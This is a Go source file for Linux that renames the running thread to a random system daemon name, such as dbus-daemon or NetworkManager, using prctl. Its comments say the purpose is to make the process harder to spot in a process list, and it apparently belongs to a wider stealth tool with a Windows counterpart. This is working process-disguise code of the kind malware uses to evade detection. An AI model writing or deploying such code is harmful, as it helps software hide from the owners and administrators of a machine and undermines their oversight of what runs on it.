//go:build linux

// Package camouflage implements process name randomisation on Linux.
//
// On Linux we use the prctl(PR_SET_NAME) syscall to rename the calling thread.
// This changes the name shown by "ps" and "/proc/<pid>/comm" to something
// that looks like a harmless system daemon, making the process harder to spot
// for a user scanning the process list.
//
// Java analogy: there is no direct Java equivalent – this is a Linux-specific
// syscall. The closest analogy is Thread.setName() which renames a Java thread
// (visible in jstack output), but that does not affect the OS-level process name.
package camouflage

import (
	"log/slog"
	"math/rand"
	"unsafe"

	"golang.org/x/sys/unix"
)

// systemLikeNames is a curated list of common Linux daemon names that blend in
// with the background noise of a typical system process table.
var systemLikeNames = []string{
	"systemd-resolved",
	"NetworkManager",
	"dbus-daemon",
	"dhclient",
	"avahi-daemon",
	"polkitd",
	"udisksd",
}

// Randomize renames the calling thread to a random system-like name using the
// prctl(PR_SET_NAME) system call.
//
// The serviceName parameter is accepted for API compatibility with the Windows
// implementation but is not used on Linux.
//
// Note: math/rand is used here because the randomness does not need to be
// cryptographically secure – we are only choosing a process name from a small
// pool, not generating secrets.  Go 1.20+ automatically seeds math/rand with a
// random value at startup, so consecutive runs produce different results.
//
// Note: PR_SET_NAME only affects the name of the calling OS thread (goroutine
// scheduler thread).  The main executable path reported by /proc/<pid>/exe is
// unchanged.
func Randomize(serviceName string) {
	log := slog.Default().With("component", "camouflage")

	name := systemLikeNames[rand.Intn(len(systemLikeNames))]

	// The kernel accepts at most 16 bytes (including the NUL terminator).
	// Allocate a fixed-size byte array padded with zeros.
	var buf [16]byte
	copy(buf[:], name)

	// unix.PrctlRetInt corresponds to prctl(2) with PR_SET_NAME.
	// unsafe.Pointer converts our array to the uintptr the kernel expects.
	if err := unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&buf[0])), 0, 0, 0); err != nil {
		log.Warn("process name randomisation failed", "error", err)
		return
	}

	log.Info("process name randomised", "name", name)
}
